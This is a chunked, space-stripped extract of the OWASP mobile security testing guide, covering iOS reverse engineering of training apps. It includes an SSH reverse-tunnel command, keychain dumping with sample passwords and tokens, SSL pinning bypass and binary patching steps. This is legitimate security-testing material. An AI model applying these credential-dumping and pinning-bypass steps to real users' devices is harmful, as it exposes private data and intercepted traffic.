convenienttohaveanon-deviceshellapp,whichyoucanusetofirstSSHoutofthedevicewithareverseshell,andthen connectfromyourhostcomputertoit. OpeningareverseshelloverSSHcanbedonebyrunningthecommandssh -R <remote_port>:localhost:22 <user- name>@<host_computer_ip>. Ontheon-deviceshellapprunthefollowingcommandand,whenasked,enterthepasswordofthemstguserofthehost computer: ssh-R2222:localhost:22mstg@192.168.197.235 On your host computer run the following command and, when asked, enter the password of the root user of the iOS device: ssh-p2222root@localhost Extracting Information from the Application Binary 368\\nPlatform: ios You can use radare to get information about the binary, such as the architecture, the list of shared libraries, the list of classesandmethods,stringsandmore. Let’susetheDamnVulnerableiOSAppDVIAv1asanexample. Openitsmainbinarywithradare2: r2DamnVulnerableIOSApp Binary Information Togetinformationaboutthebinary, youcanusetheicommand. Thiscommandwilllistinformationaboutthebinary, suchasthearchitecture,thelistofsharedlibraries,thelistofclassesandmethods,stringsandmore. [0x1000180c8]>i ... size 0x43d5f0 humansz 4.2M mode r-x format mach064 iorw false block 0x100 packet xtr.fatmach0 ... lang objcwithblocks linenum false lsyms false nx false os ios",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 129
    }
  },
  {
    "text": "binary, such as the architecture, the list of shared libraries, the list of classesandmethods,stringsandmore. Let’susetheDamnVulnerableiOSAppDVIAv1asanexample. Openitsmainbinarywithradare2: r2DamnVulnerableIOSApp Binary Information Togetinformationaboutthebinary, youcanusetheicommand. Thiscommandwilllistinformationaboutthebinary, suchasthearchitecture,thelistofsharedlibraries,thelistofclassesandmethods,stringsandmore. [0x1000180c8]>i ... size 0x43d5f0 humansz 4.2M mode r-x format mach064 iorw false block 0x100 packet xtr.fatmach0 ... lang objcwithblocks linenum false lsyms false nx false os ios pic true relocs true sanitizefalse static false strippedtrue Classes and Methods Andthenwecanproceedtoextractinformationaboutthemethodsintheapplication’ssourcecode. Todothis,weneed toloadtheapplicationbinaryintoradareandthenlisttheclassesandmethodsinthebinary. [0x1000180c8]>icc ... @interfaceSFAntiPiracy:NSObject { } +(int)isPirated +(int)isJailbroken +(void)killApplication +(bool)isTheDeviceJailbroken +(bool)isTheApplicationCracked +(bool)isTheApplicationTamperedWith +(int)urlCheck ... @end Notetheplussign,whichmeansthatthisisaclassmethodthatreturnsaBOOLtype. Aminussignwouldmeanthatthis isaninstancemethod. Refertolatersectionstounderstandthepracticaldifferencebetweenthese. Linked Libraries Thefollowingcommandislistingsharedlibraries: 369\\n[0x1000180c8]>il [Linkedlibraries] /System/Library/Frameworks/SystemConfiguration.framework/SystemConfiguration /System/Library/Frameworks/StoreKit.framework/StoreKit /System/Library/Frameworks/Security.framework/Security /System/Library/Frameworks/QuartzCore.framework/QuartzCore /System/Library/Frameworks/MobileCoreServices.framework/MobileCoreServices /usr/lib/libz.1.dylib /System/Library/Frameworks/CoreLocation.framework/CoreLocation /System/Library/Frameworks/CoreGraphics.framework/CoreGraphics /System/Library/Frameworks/CFNetwork.framework/CFNetwork /System/Library/Frameworks/AudioToolbox.framework/AudioToolbox /System/Library/Frameworks/CoreData.framework/CoreData /System/Library/Frameworks/UIKit.framework/UIKit /System/Library/Frameworks/Foundation.framework/Foundation /usr/lib/libobjc.A.dylib /usr/lib/libSystem.B.dylib /System/Library/Frameworks/CoreFoundation.framework/CoreFoundation 16libraries Strings Obtainingstringsisveryusefulwhenreverseengineeringanappbecauseitcangiveyoualotofinformationaboutthe app’sfunctionality. Forexample,youcanfindURLs,APIendpoints,encryptionkeys,andmore. Youcanalsofindstrings that will point you to interesting functions, such as the login function or a function that checks whether the device is jailbroken. [0x1000180c8]>izz~cstring |less 299030x001d0b4c0x1001d0b4c5 6 5.__TEXT.__cstring ascii Admin 299040x001d0b520x1001d0b5213 14 5.__TEXT.__cstring ascii This!sA5Ecret 299050x001d0b600x1001d0b6015 16 5.__TEXT.__cstring ascii pushSuccessPage 299060x001d0b700x1001d0b704 5 5.__TEXT.__cstring ascii Oops 299070x001d0b750x1001d0b7530 31 5.__TEXT.__cstring ascii IncorrectUsernameorPassword 299080x001d0b940x1001d0b9417 18 5.__TEXT.__cstring ascii usernameTextField 299090x001d0ba60x1001d0ba639 40 5.__TEXT.__cstring ascii T@\"UITextField\",&,N,V_usernameTextField 299100x001d0bce0x1001d0bce17 18 5.__TEXT.__cstring ascii passwordTextField ... 299150x001d0ca80x1001d0ca818 19 5.__TEXT.__cstring ascii http://google.com/ 299260x001d0d730x1001d0d7337 38 5.__TEXT.__cstring ascii RequestSentusingpinning,lookout! 299270x001d0d990x1001d0d9977 78 5.__TEXT.__cstring ascii Certificatevalidationfailed. Youwillhavetodobetterthanthis,myboy!! Patching React Native Apps Platform: ios IftheReactNativeframeworkhasbeenusedfordevelopment,themainapplicationcodeisinthefilePayload/[APP]. app/main.jsbundle. ThisfilecontainstheJavaScriptcode. Mostofthetime,theJavaScriptcodeinthisfileisminified. WiththetoolJStillery,ahuman-readableversionofthefilecanberetried,whichwillallowcodeanalysis. TheCLIversion ofJStilleryandthelocalserverarepreferabletotheonlineversionbecausethelatterdisclosesthesourcecodetoathird party. Atinstallationtime,theapplicationarchiveisunpackedintothefolder/private/var/containers/Bundle/Application/ [GUID]/[APP].appfromiOS10onward,sothemainJavaScriptapplicationfilecanbemodifiedatthislocation. Toidentifytheexactlocationoftheapplicationfolder,youcanusethetoolipainstaller: 1. Use the command ipainstaller -l to list the applications installed on the device. Get the name of the target applicationfromtheoutputlist. 2. Usethecommandipainstaller -i [APP_NAME]todisplayinformationaboutthetargetapplication,includingthe installationanddatafolderlocations. 3. TakethepathreferencedatthelinethatstartswithApplication:. UsethefollowingapproachtopatchtheJavaScriptfile: 1. Navigatetotheapplicationfolder. 2. CopythecontentsofthefilePayload/[APP].app/main.jsbundletoatemporaryfile. 370\\n3. UseJStillerytobeautifyandde-obfuscatethecontentsofthetemporaryfile. 4. Identifythecodeinthetemporaryfilethatshouldbepatchedandpatchit. 5. PutthepatchedcodeonasinglelineandcopyitintotheoriginalPayload/[APP].app/main.jsbundlefile. 6. Closeandrestarttheapplication. Patching Platform: ios Timetogetserious! Asyoualreadyknow,IPAfilesareactuallyZIParchives,soyoucanuseanyZIPtooltounpackthe archive. unzip UnCrackable-Level1.ipa Retrieving Cross References Platform: ios Ghidra can be used for analyzing the iOS binaries and obtaining cross references by right clicking the desired function andselectingShowReferencesto. Installing Apps Platform: ios When you install an application without using Apple’s App Store, this is called sideloading. There are various ways of sideloadingwhicharedescribedbelow. OntheiOSdevice,theactualinstallationprocessisthenhandledbytheinstalld daemon, which will unpack and install the application. To integrate app services or be installed on an iOS device, all applicationsmustbesignedwithacertificateissuedbyApple. Thismeansthattheapplicationcanbeinstalledonlyafter successful code signature verification. On a jailbroken phone, however, you can circumvent this security feature with AppSync,apackageavailableintheCydiastore. Itcontainsnumeroususefulapplicationsthatleveragejailbreak-provided root privileges to execute advanced functionality. AppSync is a tweak that patches installd, allowing the installation of fake-signedIPApackages. DifferentmethodsexistforinstallinganIPApackageontoaniOSdevice,whicharedescribedindetailbelow. PleasenotethatiTunesisnolongeravailableinmacOSCatalina. IfyouareusinganolderversionofmacOS,iTunes isstillavailablebutsinceiTunes12.7itisnotpossibletoinstallapps. Cydia Impactor CydiaImpactorwasoriginallycreatedtojailbreakiPhones,buthasbeenrewrittentosignandinstallIPApackagestoiOS devices via sideloading (and even APK files to Android devices). Cydia Impactor is available for Windows, macOS and Linux. Astepbystepguideandtroubleshootingstepsareavailableonyalujailbreak.net. libimobiledevice OnLinuxandalsomacOS,youcanalternativelyuselibimobiledevice,across-platformsoftwareprotocollibraryandaset oftoolsfornativecommunicationwithiOSdevices. ThisallowsyoutoinstallappsoveraUSBconnectionbyexecuting ideviceinstaller. TheconnectionisimplementedwiththeUSBmultiplexingdaemonusbmuxd,whichprovidesaTCPtunnel overUSB. ThepackageforlibimobiledevicewillbeavailableinyourLinuxpackagemanager. OnmacOSyoucaninstalllibimobilede- viceviabrew: 371\\nbrewinstalllibimobiledevice brewinstallideviceinstaller After the installation you have several new command line tools available, such as ideviceinfo, ideviceinstaller or idevicedebug. ##ThefollowingcommandwillshowdetailedinformationabouttheiOSdeviceconnectedviaUSB. $ideviceinfo ##ThefollowingcommandwillinstalltheIPAtoyouriOSdevice. $ideviceinstaller -iiGoat-Swift_v1.0-frida-codesigned.ipa ... Install:Complete ##Thefollowingcommandwillstarttheappindebugmode,byprovidingthebundlename.Thebundlenamecanbefoundinthepreviouscommandafter\"Installing\". $idevicedebug -drunOWASP.iGoat-Swift ipainstaller TheIPAcanalsobedirectlyinstalledontheiOSdeviceviathecommandlinewithipainstaller. Aftercopyingthefileover tothedevice,forexampleviascp,youcanexecuteipainstallerwiththeIPA’sfilename: ipainstallerApp_name.ipa ios-deploy OnmacOSyoucanalsousetheios-deploytooltoinstalliOSappsfromthecommandline. You’llneedtounzipyourIPA sinceios-deployusestheappbundlestoinstallapps. unzip Name.ipa ios-deploy --bundle 'Payload/Name.app' -W-d-v AftertheappisinstalledontheiOSdevice,youcansimplystartitbyaddingthe-mflagwhichwilldirectlystartdebugging withoutinstallingtheappagain. ios-deploy --bundle 'Payload/Name.app' -W-d-v-m Xcode ItisalsopossibletousetheXcodeIDEtoinstalliOSappsbydoingthefollowingsteps: 1. StartXcode 2. SelectWindow/DevicesandSimulators 3. SelecttheconnectediOSdeviceandclickonthe+signinInstalledApps. Allow Application Installation on a Non-iPad Device SometimesanapplicationcanrequiretobeusedonaniPaddevice. IfyouonlyhaveiPhoneoriPodtouchdevicesthen youcanforcetheapplicationtoaccepttobeinstalledandusedonthesekindsofdevices. Youcandothisbychanging thevalueofthepropertyUIDeviceFamilytothevalue1intheInfo.plistfile. <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE plist PUBLIC\"-//Apple//DTDPLIST1.0//EN\"\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"> <plist version=\"1.0\"> <dict> <key>UIDeviceFamily</key> <array> <integer>1</integer> </array> </dict> </plist> 372\\nItisimportanttonotethatchangingthisvaluewillbreaktheoriginalsignatureoftheIPAfilesoyouneedtore-signthe IPA,aftertheupdate,inordertoinstallitonadeviceonwhichthesignaturevalidationhasnotbeendisabled. ThisbypassmightnotworkiftheapplicationrequirescapabilitiesthatarespecifictomoderniPadswhileyouriPhoneor iPodisabitolder. PossiblevaluesforthepropertyUIDeviceFamilycanbefoundintheAppleDeveloperdocumentation. Onefundamentalstepwhenanalyzingappsisinformationgathering. Thiscanbedonebyinspectingtheapppackage on your host computer or remotely by",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 130
    }
  },
  {
    "text": "-W-d-v-m Xcode ItisalsopossibletousetheXcodeIDEtoinstalliOSappsbydoingthefollowingsteps: 1. StartXcode 2. SelectWindow/DevicesandSimulators 3. SelecttheconnectediOSdeviceandclickonthe+signinInstalledApps. Allow Application Installation on a Non-iPad Device SometimesanapplicationcanrequiretobeusedonaniPaddevice. IfyouonlyhaveiPhoneoriPodtouchdevicesthen youcanforcetheapplicationtoaccepttobeinstalledandusedonthesekindsofdevices. Youcandothisbychanging thevalueofthepropertyUIDeviceFamilytothevalue1intheInfo.plistfile. <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE plist PUBLIC\"-//Apple//DTDPLIST1.0//EN\"\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"> <plist version=\"1.0\"> <dict> <key>UIDeviceFamily</key> <array> <integer>1</integer> </array> </dict> </plist> 372\\nItisimportanttonotethatchangingthisvaluewillbreaktheoriginalsignatureoftheIPAfilesoyouneedtore-signthe IPA,aftertheupdate,inordertoinstallitonadeviceonwhichthesignaturevalidationhasnotbeendisabled. ThisbypassmightnotworkiftheapplicationrequirescapabilitiesthatarespecifictomoderniPadswhileyouriPhoneor iPodisabitolder. PossiblevaluesforthepropertyUIDeviceFamilycanbefoundintheAppleDeveloperdocumentation. Onefundamentalstepwhenanalyzingappsisinformationgathering. Thiscanbedonebyinspectingtheapppackage on your host computer or remotely by accessing the app data on the device. You’ll find more advance techniques in thesubsequentchaptersbut,fornow,wewillfocusonthebasics: gettingalistofallinstalledapps,exploringtheapp packageandaccessingtheappdatadirectoriesonthedeviceitself. Thisshouldgiveyouabitofcontextaboutwhatthe app is all about without even having to reverse engineer it or perform more advanced analysis. We will be answering questionssuchas: • Whichfilesareincludedinthepackage? • WhichFrameworksdoestheappuse? • Whichcapabilitiesdoestheapprequire? • Whichpermissionsdoestheapprequesttotheuserandforwhatreason? • Doestheappallowanyunsecuredconnections? • Doestheappcreateanynewfileswhenbeinginstalled? Get Open Connections Platform: ios lsofcommandwheninvokedwithoption-i,itgivesthelistofopennetworkportsforallactiveprocessesonthedevice. Togetalistofopennetworkportsforaspecificprocess,thelsof-i-a-p<pid>commandcanbeused,where-a(AND) optionisusedforfiltering. BelowafilteredoutputforPID1isshown. iPhone:~root#lsof -i-a-p1 COMMANDPIDUSER FD TYPE DEVICESIZE/OFFNODENAME launchd 1root 27u IPv60x69c2ce210efdc023 0t0 TCP *:ssh (LISTEN) launchd 1root 28u IPv60x69c2ce210efdc023 0t0 TCP *:ssh (LISTEN) launchd 1root 29u IPv40x69c2ce210eeaef53 0t0 TCP *:ssh (LISTEN) launchd 1root 30u IPv40x69c2ce210eeaef53 0t0 TCP *:ssh (LISTEN) launchd 1root 31u IPv40x69c2ce211253b90b 0t0 TCP192.168.1.12:ssh->192.168.1.8:62684 (ESTABLISHED) launchd 1root 42u IPv40x69c2ce211253b90b 0t0 TCP192.168.1.12:ssh->192.168.1.8:62684 (ESTABLISHED) Dumping KeyChain Data Platform: ios DumpingtheKeyChaindatacanbedonewithmultipletools,butnotallofthemwillworkonanyiOSversion. Asismore oftenthecase,trythedifferenttoolsorlookuptheirdocumentationforinformationonthelatestsupportedversions. Objection (Jailbroken / non-Jailbroken) The KeyChain data can easily be viewed using Objection. First, connect objection to the app as described in “Recom- mendedTools-Objection”. Then,usetheios keychain dumpcommandtogetanoverviewofthekeychain: $objection --gadget=\"iGoat-Swift\" explore ...[usb]#ioskeychaindump ... Note:YoumaybeaskedtoauthenticateusingthedevicespasscodeorTouchID Savetheoutputbyadding `--jsonkeychain.json`tothiscommand DumpingtheiOSkeychain... Created Accessible ACL Type Account Service Data ------------------------- ------------------------------ ----- -------- ------------------- -------------------------- ↪ ---------------------------------------------------------------------- 2019-06-0610:53:09+0000 WhenUnlocked None Password keychainValue com.highaltitudehacks.dvia mypassword123 2019-06-0610:53:30+0000 WhenUnlockedThisDeviceOnly None Password SCAPILazyVector com.toyopagroup.picaboo (failedtodecode) 2019-06-0610:53:30+0000 AfterFirstUnlockThisDeviceOnly None Password fideliusDeviceGraph com.toyopagroup.picaboo (failedtodecode) 373\\n2019-06-0610:53:30+0000 AfterFirstUnlockThisDeviceOnly None Password SCDeviceTokenKey2 com.toyopagroup.picaboo ↪ 00001:FKsDMgVISiavdm70v9Fhv5z+pZfBTTN7xkwSwNvVr2IhVBqLsC7QBhsEjKMxrEjh 2019-06-0610:53:30+0000 AfterFirstUnlockThisDeviceOnly None Password SCDeviceTokenValue2 com.toyopagroup.picaboo ↪ CJ8Y8K2oE3rhOFUhnxJxDS1Zp8Z25XzgY2EtFyMbW3U= OWASP.iGoat-Swifton (iPhone:12.0)[usb] #quit Notethatcurrently,thelatestversionsoffrida-serverandobjectiondonotcorrectlydecodeallkeychaindata. Different combinationscanbetriedtoincreasecompatibility. Forexample,thepreviousprintoutwascreatedwithfrida-tools==1. 3.0,frida==12.4.8andobjection==1.5.0. Finally, sincethekeychaindumperisexecutedfromwithintheapplicationcontext, itwillonlyprintoutkeychainitems thatcanbeaccessedbytheapplicationandnottheentirekeychainoftheiOSdevice. Grapefruit (Jailbroken / non-Jailbroken) WithGrapefruitit’spossibletoaccessthekeychaindataoftheappyouhaveselected. InsidetheStoragesection,click onKeychainandyoucanseealistingofthestoredKeychaininformation. Keychain-dumper (Jailbroken) YoucanuseKeychain-dumperdumpthejailbrokendevice’sKeyChaincontents. Onceyouhaveitrunningonyourdevice: iPhone:~root#/tmp/keychain_dumper (...) GenericPassword ---------------- Service:myApp Account:key3 EntitlementGroup:RUD9L355Y.sg.vantagepoint.example Label: (null) GenericField: (null) KeychainData:SmJSWxEs GenericPassword ---------------- 374\\nService:myApp Account:key7 EntitlementGroup:RUD9L355Y.sg.vantagepoint.example Label: (null) GenericField: (null) KeychainData:WOg1DfuH In newer versions of iOS (iOS 11 and up), additional steps are necessary. See the README.md for more details. Note thatthisbinaryissignedwithaself-signedcertificatethathasa“wildcard”entitlement. Theentitlementgrantsaccess toallitemsintheKeychain. Ifyouareparanoidorhaveverysensitiveprivatedataonyourtestdevice,youmaywantto buildthetoolfromsourceandmanuallysigntheappropriateentitlementsintoyourbuild;instructionsfordoingthisare availableintheGitHubrepository. Disassembling Native Code Platform: ios BecauseObjective-CandSwiftarefundamentallydifferent,theprogramminglanguageinwhichtheappiswrittenaffects thepossibilitiesforreverseengineeringit. Forexample,Objective-Callowsmethodinvocationstobechangedatruntime. Thismakeshookingintootherappfunctions(atechniqueheavilyusedbyCycriptandotherreverseengineeringtools) easy. This“methodswizzling”isnotimplementedthesamewayinSwift,andthedifferencemakesthetechniqueharder toexecutewithSwiftthanwithObjective-C. On iOS, all the application code (both Swiftand Objective-C) is compiled to machine code (e.g. ARM). Thus, to analyze iOSapplicationsadisassemblerisneeded. IfyouwanttodisassembleanapplicationfromtheAppStore,removetheFairplayDRMfirst. Section“AcquiringtheApp Binary”inthechapter“iOSBasicSecurityTesting”explainshow. In this section the term “app binary” refers to the Macho-O file in the application bundle which contains the compiled code,andshouldnotbeconfusedwiththeapplicationbundle-theIPAfile. Seesection“ExploringtheAppPackage”in chapter“BasiciOSSecurityTesting”formoredetailsonthecompositionofIPAfiles. Disassembling With IDA Pro IfyouhavealicenseforIDAPro,youcananalyzetheappbinaryusingIDAProaswell. ThefreeversionofIDAunfortunatelydoesnotsupporttheARMprocessortype. Togetstarted,simplyopentheappbinaryinIDAPro. 375\\nUpon opening the file, IDA Pro will perform auto-analysis, which can take a while depending on the size of the binary. Oncetheauto-analysisiscompletedyoucanbrowsethedisassemblyintheIDAView(Disassembly)windowandexplore functionsintheFunctionswindow,bothshowninthescreenshotbelow. A regular IDA Pro license does not include a decompiler by default and requires an additional license for the Hex-Rays decompiler, which is expensive. In contrast, Ghidra comes with a very capable free builtin decompiler, making it a compellingalternativetouseforreverseengineering. IfyouhavearegularIDAProlicenseanddonotwanttobuytheHex-Raysdecompiler,youcanuseGhidra’sdecompiler byinstallingtheGhIDApluginforIDAPro. ThemajorityofthischapterappliestoapplicationswritteninObjective-Corhavingbridgedtypes,whicharetypescom- patible with both Swift and Objective-C. The Swift compatibility of most tools that work well with Objective-C is being improved. 376\\nReviewing Decompiled Objective-C and Swift Code Platform: ios TODO:Don’thavethisyet Reviewing Disassembled Objective-C and Swift Code Platform: ios In this section we will",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 131
    }
  },
  {
    "text": "decompiler, making it a compellingalternativetouseforreverseengineering. IfyouhavearegularIDAProlicenseanddonotwanttobuytheHex-Raysdecompiler,youcanuseGhidra’sdecompiler byinstallingtheGhIDApluginforIDAPro. ThemajorityofthischapterappliestoapplicationswritteninObjective-Corhavingbridgedtypes,whicharetypescom- patible with both Swift and Objective-C. The Swift compatibility of most tools that work well with Objective-C is being improved. 376\\nReviewing Decompiled Objective-C and Swift Code Platform: ios TODO:Don’thavethisyet Reviewing Disassembled Objective-C and Swift Code Platform: ios In this section we will be exploring iOS application’s binary code manually and perform static analysis on it. Manual analysiscanbeaslowprocessandrequiresimmensepatience. Agoodmanualanalysiscanmakethedynamicanalysis moresuccessful. Therearenohardwrittenrulesforperformingstaticanalysis,buttherearefewrulesofthumbwhichcanbeusedtohave asystematicapproachtomanualanalysis: • Understandtheworkingoftheapplicationunderevaluation-theobjectiveoftheapplicationandhowitbehaves incaseofwronginput. • Explore the various strings present in the application binary, this can be very helpful, for example in spotting interestingfunctionalitiesandpossibleerrorhandlinglogicintheapplication. • Lookforfunctionsandclasseshavingnamesrelevanttoourobjective. • Lastly,findthevariousentrypointsintotheapplicationandfollowalongfromtheretoexploretheapplication. Techniquesdiscussedinthissectionaregenericandapplicableirrespectiveofthetoolsusedforanalysis. Objective-C Inadditiontothetechniqueslearnedinthe“DisassemblingandDecompiling”section,forthissectionyou’llneedsome understanding of the Objective-C runtime. For instance, functions like _objc_msgSend or _objc_release are specially meaningfulfortheObjective-Cruntime. WewillbeusingtheUnCrackableAppforiOSLevel1,whichhasthesimplegoaloffindingasecretstringhiddensomewhere inthebinary. Theapplicationhasasinglehomescreenandausercaninteractviainputtingcustomstringsintheprovided textfield. Whentheuserinputsthewrongstring,theapplicationshowsapop-upwiththe“VerificationFailed”message. 377\\nYou can keep note of the strings displayed in the pop-up, as this might be helpful when searching for the code where the input is processed and a decision is being made. Luckily, the complexity and interaction with this application is straightforward,whichbodeswellforourreversingendeavors. Forstaticanalysisinthissection,wewillbeusingGhidra9.0.4. Ghidra9.1_betaauto-analysishasabuganddoes notshowtheObjective-Cclasses. WecanstartbycheckingthestringspresentinthebinarybyopeningitinGhidra. Thelistedstringsmightbeoverwhelming atfirst,butwithsomeexperienceinreversingObjective-Ccode,you’lllearnhowtofilteranddiscardthestringsthatare notreallyhelpfulorrelevant. Forinstance,theonesshowninscreenshotbelow,whicharegeneratedfortheObjective-C runtime. Otherstringsmightbehelpfulinsomecases,suchasthosecontainingsymbols(functionnames,classnames, etc.) andwe’llbeusingthemwhenperformingstaticanalysistocheckifsomespecificfunctionisbeingused. 378\\nIf we continue our careful analysis, we can spot the string, “Verification Failed”, which is used for the pop-up when a wronginputisgiven. Ifyoufollowthecross-references(Xrefs)ofthisstring,youwillreachbuttonClickfunctionofthe ViewControllerclass. WewilllookintothebuttonClickfunctionlaterinthissection. Whenfurthercheckingtheother strings in the application, only a few of them look a likely candidate for a hidden flag. You can try them and verify as well. 379\\nMoving forward, we have two paths to take. Either we can start analyzing the buttonClick function identified in the abovestep,orstartanalyzingtheapplicationfromthevariousentrypoints. Inrealworldsituation,mosttimesyouwill betakingthefirstpath,butfromalearningperspective,inthissectionwewilltakethelatterpath. AniOSapplicationcallsdifferentpredefinedfunctionsprovidedbytheiOSruntimedependingonitsthestatewithinthe applicationlifecycle. Thesefunctionsareknownastheentrypointsoftheapp. Forexample: • [AppDelegate application:didFinishLaunchingWithOptions:] iscalledwhentheapplicationisstartedforthe firsttime. • [AppDelegate applicationDidBecomeActive:] iscalled when the application is moving frominactive to active state. Manyapplicationsexecutecriticalcodeinthesesectionsandthereforethey’renormallyagoodstartingpointinorderto followthecodesystematically. Oncewe’redonewiththeanalysisofallthefunctionsintheAppDelegateclass,wecanconcludethatthereisnorelevant codepresent. Thelackofanycodeintheabovefunctionsraisesthequestion-fromwhereistheapplication’sinitialization codebeingcalled? Luckilythecurrentapplicationhasasmallcodebase,andwecanfindanotherViewControllerclassintheSymbolTree view. Inthisclass,functionviewDidLoadfunctionlooksinteresting. IfyoucheckthedocumentationofviewDidLoad,you canseethatitcanalsobeusedtoperformadditionalinitializationonviews. 380\\nIfwecheckthedecompilationofthisfunction,thereareafewinterestingthingsgoingon. Forinstance,thereisacallto anativefunctionatline31andalabelisinitializedwithasetHiddenflagsetto1inlines27-29. Youcankeepanoteof theseobservationsandcontinueexploringtheotherfunctionsinthisclass. Forbrevity,exploringtheotherpartsofthe functionisleftasanexerciseforthereaders. In our first step, we observed that the application verifies the input string only when the UI button is pressed. Thus, analyzingthebuttonClickfunctionisanobvioustarget. Asearliermentioned,thisfunctionalsocontainsthestringwe seeinthepop-ups. Atline29adecisionisbeingmade,whichisbasedontheresultofisEqualString(outputsavedin uVar1atline23). Theinputforthecomparisoniscomingfromthetextinputfield(fromtheuser)andthevalueofthe label. Therefore,wecanassumethatthehiddenflagisstoredinthatlabel. 381\\nNowwehavefollowedthecompleteflowandhavealltheinformationabouttheapplicationflow. Wealsoconcludedthat thehiddenflagispresentinatextlabelandinordertodeterminethevalueofthelabel,weneedtorevisitviewDidLoad function,andunderstandwhatishappeninginthenativefunctionidentified. Analysisofthenativefunctionisdiscussed in“ReviewingDisassembledNativeCode”. Bypassing Certificate Pinning Platform: ios SomeapplicationswillimplementSSLPinning,whichpreventstheapplicationfromacceptingyourinterceptingcertificate asavalidcertificate. Thismeansthatyouwillnotbeabletomonitorthetrafficbetweentheapplicationandtheserver. Formostapplications,certificatepinningcanbebypassedwithinseconds,butonlyiftheappusestheAPIfunctionsthat 382\\narecoveredbythesetools. IftheappisimplementingSSLPinningwithacustomframeworkorlibrary,theSSLPinning mustbemanuallypatchedanddeactivated,whichcanbetime-consuming. ThissectiondescribesvariouswaystobypassSSLPinningandgivesguidanceaboutwhatyoushoulddowhentheexisting toolsdon’twork. Methods for Jailbroken and Non-jailbroken Devices Ifyouhaveajailbrokendevicewithfrida-serverinstalled,youcanbypassSSLpinningbyrunningthefollowingObjection command(repackageyourappifyou’reusinganon-jailbrokendevice): iossslpinningdisable Here’sanexampleoftheoutput: SeealsoObjection’shelponDisablingSSLPinningforiOSforfurtherinformationandinspectthepinning.tsfiletounder- standhowthebypassworks. Methods for Jailbroken Devices Only IfyouhaveajailbrokendeviceyoucantryoneofthefollowingtoolsthatcanautomaticallydisableSSLPinning: • “SSLKillSwitch2”isonewaytodisablecertificatepinning. ItcanbeinstalledviatheCydiastore. Itwillhookonto allhigh-levelAPIcallsandbypasscertificatepinning. • TheBurpSuiteMobileAssistantappcanalsobeusedtobypasscertificatepinning. When the Automated Bypasses Fail Technologiesandsystemschangeovertime,andsomebypasstechniquesmightnotworkeventually. Hence,it’spartof thetesterworktodosomeresearch,sincenoteverytoolisabletokeepupwithOSversionsquicklyenough. SomeappsmightimplementcustomSSLpinningmethods,sothetestercouldalsodevelopnewbypassscriptsmaking useofexistingonesasabaseorinspirationandusingsimilartechniquesbuttargetingtheapp’scustomAPIs. Hereyou caninspectthreegoodexamplesofsuchscripts: • “objection-PinningBypassModule”(pinning.ts) • “FridaCodeShare-ios10-ssl-bypass”by@dki • “CircumventingSSLPinninginobfuscatedappswithOkHttp”byJeroenBeckers 383\\nOtherTechniques: Ifyoudon’thaveaccesstothesource,youcantrybinarypatching: • IfOpenSSLcertificatepinningisused,youcantrybinarypatching. • Sometimes,thecertificateisafileintheapplicationbundle. ReplacingthecertificatewithBurp’scertificatemay besufficient,butbewareofthecertificate’sSHAsum. Ifit’shardcodedintothebinary,youmustreplaceittoo! • Ifyoucanaccessthesourcecodeyoucouldtrytodisablecertificatepinningandrecompiletheapp, lookforAPI callsforNSURLSession,CFStream,andAFNetworkingandmethods/stringscontainingwordslike“pinning”,“X.509”, “Certificate”,etc. Listing Installed Apps Platform: ios When targeting apps that are installed on the device, you’ll first have to figure out the correct bundle identifier of the applicationyouwanttoanalyze. Youcanusefrida-ps-Uaitogetallapps(-a)currentlyinstalled(-i)ontheconnected USBdevice(-U): $frida-ps -Uai PID Name Identifier ---- ------------------- ----------------------------------------- 6847 Calendar com.apple.mobilecal 6815 Mail com.apple.mobilemail - AppStore com.apple.AppStore - AppleStore com.apple.store.Jolly - Calculator com.apple.calculator - Camera com.apple.camera - iGoat-Swift OWASP.iGoat-Swift Italsoshowswhichofthemarecurrentlyrunning. Takeanoteofthe“Identifier”(bundleidentifier)andthePIDifanyas you’llneedthemafterwards. YoucanalsodirectlyopenGrapefruitandafterselectingyouriOSdeviceyou’llgetthelistofinstalledapps. Debugging Platform: ios ComingfromaLinuxbackgroundyou’dexpecttheptracesystemcalltobeaspowerfulasyou’reusedtobut,forsome reason, Apple decided to leave it incomplete. iOS debuggers such as LLDB use it for attaching, stepping or continuing theprocessbuttheycannotuseittoreadorwritememory(allPT_READ_*andPT_WRITE*requestsaremissing). Instead, they have to obtain a so-called Mach task port (by calling task_for_pid with the target process ID) and then use the",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 132
    }
  },
  {
    "text": "Italsoshowswhichofthemarecurrentlyrunning. Takeanoteofthe“Identifier”(bundleidentifier)andthePIDifanyas you’llneedthemafterwards. YoucanalsodirectlyopenGrapefruitandafterselectingyouriOSdeviceyou’llgetthelistofinstalledapps. Debugging Platform: ios ComingfromaLinuxbackgroundyou’dexpecttheptracesystemcalltobeaspowerfulasyou’reusedtobut,forsome reason, Apple decided to leave it incomplete. iOS debuggers such as LLDB use it for attaching, stepping or continuing theprocessbuttheycannotuseittoreadorwritememory(allPT_READ_*andPT_WRITE*requestsaremissing). Instead, they have to obtain a so-called Mach task port (by calling task_for_pid with the target process ID) and then use the MachIPCinterfaceAPIfunctionstoperformactionssuchassuspendingthetargetprocessandreading/writingregister states(thread_get_state/thread_set_state)andvirtualmemory(mach_vm_read/mach_vm_write). 384\\nFormoreinformationyoucanrefertotheLLVMprojectinGitHubwhichcontainsthesourcecodeforLLDBaswell asChapter5and13from“MacOSXandiOSInternals: TotheApple’sCore”[#levin]andChapter4“Tracingand Debugging”from“TheMacHacker’sHandbook”[#miller]. Debugging with LLDB ThedefaultdebugserverexecutablethatXcodeinstallscan’tbeusedtoattachtoarbitraryprocesses(itisusuallyused onlyfordebuggingself-developedappsdeployedwithXcode). Toenabledebuggingofthird-partyapps,thetask_for_- pid-allowentitlementmustbeaddedtothedebugserverexecutablesothatthedebuggerprocesscancalltask_for_pid toobtainthetargetMachtaskportasseenbefore. Aneasywaytodothisistoaddtheentitlementtothedebugserver binaryshippedwithXcode. Toobtaintheexecutable,mountthefollowingDMGimage: /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/DeviceSupport/<target-iOS-version>/DeveloperDiskImage.dmg 